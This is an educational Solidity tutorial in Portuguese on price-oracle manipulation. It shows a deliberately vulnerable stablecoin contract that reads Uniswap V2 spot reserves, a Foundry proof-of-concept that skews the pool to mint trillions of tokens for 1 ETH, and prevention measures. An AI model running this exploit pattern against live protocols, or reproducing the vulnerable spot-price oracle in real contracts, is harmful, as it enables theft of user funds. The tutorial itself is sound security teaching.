# Segurança de Contratos Inteligentes: S15. Manipulando Oráculos

Recentemente, tenho revisado meus conhecimentos de Solidity para consolidar os detalhes e escrever um "Guia Simplificado de Solidity" para iniciantes (os especialistas em programação podem encontrar tutoriais mais avançados). Atualizo o guia com 1 a 3 lições por semana.

Twitter: [@0xAA_Science](https://twitter.com/0xAA_Science) | [@WTFAcademy_](https://twitter.com/WTFAcademy_)

Comunidade: [Discord](https://discord.gg/5akcruXrsk) | [Grupo no WeChat](https://docs.google.com/forms/d/e/1FAIpQLSe4KGT8Sh6sJ7hedQRuIYirOoZK_85miz3dw7vA1-YjodgJ-A/viewform?usp=sf_link) | [Site oficial wtf.academy](https://wtf.academy)

Todo o código e tutoriais estão disponíveis no GitHub: [github.com/AmazingAng/WTFSolidity](https://github.com/AmazingAng/WTF-Solidity)

---

Nesta lição, vamos abordar o ataque de manipulação de oráculos em contratos inteligentes e reproduzir um exemplo de ataque: trocar 1 ETH por 17 trilhões de moedas estáveis. Apenas em 2022, os ataques de manipulação de oráculos causaram perdas superiores a 200 milhões de dólares em ativos de usuários.

## Oráculos de Preço

Por questões de segurança, a Máquina Virtual Ethereum (EVM) é um ambiente isolado e fechado. Os contratos inteligentes em execução na EVM podem acessar informações da blockchain, mas não podem se comunicar ativamente com fontes externas para obter informações fora da cadeia. No entanto, essas informações são essenciais para aplicativos descentralizados.

Os oráculos podem nos ajudar a resolver esse problema, obtendo informações de fontes externas e adicionando-as à blockchain para que os contratos inteligentes possam utilizá-las.

Um dos tipos mais comuns de oráculos é o oráculo de preço, que pode se referir a qualquer fonte de dados que permita consultar o preço de uma moeda. Alguns casos de uso típicos incluem:
- Plataformas de empréstimo descentralizado (AAVE) usam oráculos para determinar se um mutuário atingiu o limite de liquidação.
- Plataformas de ativos sintéticos (Synthetix) usam oráculos para determinar o preço mais recente do ativo e suportar transações sem deslize de preço.
- O MakerDAO usa oráculos para determinar o preço da garantia e emitir a moeda estável $DAI correspondente.

## Vulnerabilidades de Oráculos

Se um oráculo não for usado corretamente pelos desenvolvedores, pode representar um grande risco de segurança.

- Em outubro de 2021, a plataforma DeFi Cream Finance na blockchain BNB foi [hackeada e perdeu 130 milhões de dólares de fundos de usuários](https://rekt.news/cream-rekt-2/) devido a uma vulnerabilidade no oráculo.
- Em maio de 2022, a plataforma de ativos sintéticos Mirror Protocol na blockchain Terra foi [hackeada e perdeu 115 milhões de dólares de fundos de usuários](https://rekt.news/mirror-rekt/) devido a uma vulnerabilidade no oráculo.
- Em outubro de 2022, a plataforma de empréstimo descentralizado Mango Markets na blockchain Solana foi [hackeada e perdeu 115 milhões de dólares em fundos de usuários](https://rekt.news/mango-markets-rekt/) devido a uma vulnerabilidade no oráculo.

## Exemplo de Vulnerabilidade

Aqui está um exemplo de uma vulnerabilidade em um contrato chamado `oUSD`. Este contrato é uma moeda estável que segue o padrão ERC20. Assim como a plataforma de ativos sintéticos Synthetix, os usuários podem trocar ETH por oUSD sem qualquer deslize de preço, com base no preço instantâneo do par WETH-BUSD no Uniswap V2. No exemplo de ataque a seguir, veremos como esse oráculo pode ser facilmente manipulado usando empréstimos rápidos e grandes quantias de fundos.

### Contrato Vulnerável

O contrato `oUSD` possui `7` variáveis de estado para armazenar os endereços de contratos BUSD, WETH, da fábrica UniswapV2 e do par de moedas WETH-BUSD.

O contrato `oUSD` possui principalmente `3` funções:
- Construtor: Inicializa o nome e o símbolo do token ERC20.
- `getPrice()`: Oráculo de preço, obtém o preço instantâneo do par WETH-BUSD no Uniswap V2, onde reside a vulnerabilidade.
  ```
    // Obter preço do ETH
    function getPrice() public view returns (uint256 price) {
        // Reservas no par de moedas
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
        // Preço instantâneo do ETH
        price = reserve0/reserve1;
    }
  ```
- `swap()`: Função de troca, converte ETH em oUSD com base no preço fornecido pelo oráculo.

Contrato:

```solidity
contract oUSD is ERC20 {
    // Contratos principais
    address public constant FACTORY_V2 =
        0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant BUSD = 0x4Fabb145d64652a948d72533023f6E7A623C7C53;

    IUniswapV2Factory public factory = IUniswapV2Factory(FACTORY_V2);
    IUniswapV2Pair public pair = IUniswapV2Pair(factory.getPair(WETH, BUSD));
    IERC20 public weth = IERC20(WETH);
    IERC20 public busd = IERC20(BUSD);

    constructor() ERC20("Oracle USD","oUSD"){}

    // Obter preço do ETH
    function getPrice() public view returns (uint256 price) {
        // Reservas no par de moedas
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
        // Preço instantâneo do ETH
        price = reserve0/reserve1;
    }

    function swap() external payable returns (uint256 amount){
        // Obter preço
        uint price = getPrice();
        // Calcular quantidade a ser trocada
        amount = price * msg.value;
        // Emitir tokens
        _mint(msg.sender, amount);
    }
}
```

### Estratégia de Ataque

Vamos atacar a função `getPrice()` vulnerável do contrato `oUSD` com a seguinte estratégia em 4 etapas:

1. Preparar uma quantia de BUSD, seja com fundos próprios ou emprestados por meio de empréstimos rápidos. Neste caso, usaremos o cheat code `deal` do Foundry para criar `1_000_000 BUSD` em uma rede de teste local.
2. Comprar uma grande quantidade de WETH com BUSD no par WETH-BUSD do UniswapV2. Isso será feito para desequilibrar a proporção dos tokens no par, levando a um aumento significativo no preço do WETH. Veja a função `swapBUSDtoWETH()` no código de ataque.
3. Com o preço do WETH aumentado de forma manipulada no par do UniswapV2, chamamos a função `swap()` para trocar 1 ETH por uma grande quantidade de oUSD.
4. **Opcional:** Vender o WETH comprado na etapa 2 de volta para BUSD no par WETH-BUSD do UniswapV2 para recuperar o capital inicial.

Essas etapas podem ser realizadas em uma única transação.

### Reprodução com o Foundry

Optamos por usar o Foundry para reproduzir o ataque de manipulação do oráculo, pois é rápido e permite criar forks locais da mainnet para facilitar os testes. Se você não está familiarizado com o Foundry, pode ler [WTF Solidity Ferramentas T07: Foundry](../Topics/Tools/TOOL07_Foundry/readme_pt-br.md).

1. Após instalar o Foundry, execute os comandos abaixo no terminal para iniciar um novo projeto e instalar a biblioteca OpenZeppelin.
  ```shell
  forge init Oracle
  cd Oracle
  forge install Openzeppelin/openzeppelin-contracts
  ```

2. Crie um arquivo de variáveis de ambiente `.env` na raiz do projeto e adicione o RPC da mainnet para criar uma rede de teste local.

  ```
  MAINNET_RPC_URL= https://rpc.ankr.com/eth
  ```

3. Copie o código desta lição, `Oracle.sol` e `Oracle.t.sol`, para as pastas `src` e `test` na raiz do projeto, respectivamente. Em seguida, execute o seguinte comando para iniciar o script de ataque.

  ```
  forge test -vv --match-test testOracleAttack
  ```

4. Você poderá ver os resultados do ataque no terminal. Antes do ataque, o preço do ETH dado pelo oráculo `getPrice()` era de `1216 USD`, o que era normal. Após comprar `1,000,000` BUSD do UniswapV2 para WETH, o preço do ETH fornecido pelo oráculo foi manipulado para `17,979,841,782,699 USD`. Com isso, conseguimos trocar facilmente 1 ETH por 17 trilhões de oUSD e concluir o ataque.
  ```shell
  Running 1 test for test/Oracle.t.sol:OracleTest
  [PASS] testOracleAttack() (gas: 356524)
  Logs:
    1. ETH Price (before attack): 1216
    2. Swap 1,000,000 BUSD to WETH to manipulate the oracle
    3. ETH price (after attack): 17979841782699
    4. Minted 1797984178269 oUSD with 1 ETH (after attack)

  Test result: ok. 1 passed; 0 failed; finished in 262.94ms
  ```

Código do ataque:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Oracle.sol";

contract OracleTest is Test {
    address private constant alice = address(1);
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant BUSD = 0x4Fabb145d64652a948d72533023f6E7A623C7C53;
    address private constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router router;
    IWETH private weth = IWETH(WETH);
    IBUSD private busd = IBUSD(BUSD);
    string MAINNET_RPC_URL;
    oUSD ousd;

    function setUp() public {
        MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");
        // Fork de um bloco específico
        vm.createSelectFork(MAINNET_RPC_URL,16060405);
        router = IUniswapV2Router(ROUTER);
        ousd = new oUSD();
    }

    //forge test --match-test  testOracleAttack  -vv
    function testOracleAttack() public {
        // Ataque ao oráculo
        // 0. Preço do ETH antes da manipulação
        uint256 priceBefore = ousd.getPrice();
        console.log("1. ETH Price (before attack): %s", priceBefore); 
        // Adquirir 1000000 BUSD para a própria conta
        uint busdAmount = 1_000_000 * 10e18;
        deal(BUSD, alice, busdAmount);
        // 2. Comprar BUSD para WETH e manipular o oráculo
        vm.prank(alice);
        busd.transfer(address(this), busdAmount);
        swapBUSDtoWETH(busdAmount, 1);
        console.log("2. Swap 1,000,000 BUSD to WETH to manipulate the oracle");
        // 3. Preço do ETH após a manipulação
        uint256 priceAfter = ousd.getPrice();
        console.log("3. ETH price (after attack): %s", priceAfter); 
        // 4. Criar oUSD
        ousd.swap{value: 1 ether}();
        console.log("4. Minted %s oUSD with 1 ETH (after attack)", ousd.balanceOf(address(this))/10e18); 
    }

    // Swap BUSD por WETH
    function swapBUSDtoWETH(uint amountIn, uint amountOutMin)
        public
        returns (uint amountOut)
    {   
        busd.approve(address(router), amountIn);

        address[] memory path;
        path = new address[](2);
        path[0] = BUSD;
        path[1] = WETH;

        uint[] memory amounts = router.swapExactTokensForTokens(
            amountIn,
            amountOutMin,
            path,
            alice,
            block.timestamp
        );

        // amounts[0] = quantidade de BUSD, amounts[1] = quantidade de WETH
        return amounts[1];
    }
}
```

## Métodos de Prevenção

O renomado especialista em segurança de blockchain `samczsun` resumiu métodos de prevenção para ataques de manipulação de oráculos em um [artigo](https://www.paradigm.xyz/2020/11/so-you-want-to-use-a-price-oracle). Aqui estão algumas medidas:

1. Não utilizar pools de liquidez de baixa qualidade como oráculos de preço.
2. Evitar usar preços spot/instantâneos como oráculos de preço; prefira usar preços ponderados no tempo, como o preço médio ponderado no tempo (TWAP).
3. Usar oráculos descentralizados.
4. Utilizar múltiplas fontes de dados e escolher as mais próximas da mediana de preços como oráculos, evitando situações extremas.
5. Ao usar métodos de consulta do oráculo, como `latestRoundData()`, certifique-se de verificar os resultados retornados para evitar o uso de dados obsoletos.
6. Ler atentamente a documentação e configurar adequadamente os parâmetros de uso de oráculos de terceiros.

## Conclusão

Nesta lição, discutimos o ataque de manipulação de oráculos e atacamos um contrato de moeda estável com falhas, trocando 1 ETH por 17 trilhões de oUSD. Esses ataques podem causar grandes perdas aos usuários e são uma ameaça significativa à segurança dos contratos inteligentes.

<!-- This file was translated using AI by repo_ai_translate. For more information, visit https://github.com/marcelojsilva/repo_ai_translate -->